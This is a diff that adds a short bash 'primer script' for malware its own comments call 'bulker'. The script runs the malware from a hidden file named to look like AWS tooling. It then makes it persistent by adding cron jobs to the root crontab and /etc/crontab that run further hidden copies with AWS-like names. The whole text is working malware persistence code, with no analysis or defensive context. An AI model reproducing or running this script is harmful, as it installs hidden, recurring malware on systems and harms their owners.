@@ -1,0 +1,13 @@
+#!/bin/bash
+# Primer Script for Bulker
+
+
+# Running original bulker malware.
+bash /run/aws/.ec2-instance
+
+# Adding .aws-backup (bulker copy) to root crontab.
+(crontab -l 2>/dev/null || true; echo "*/10 * * * * /usr/share/.aws-backup") | crontab -
+
+# Adding .ec2-instance-connect (other bulker copy) to /etc/crontab.
+echo "*/52 * * * * root /root/.ssh/.aws/.ec2-instance-connect" >> /etc/crontab
+
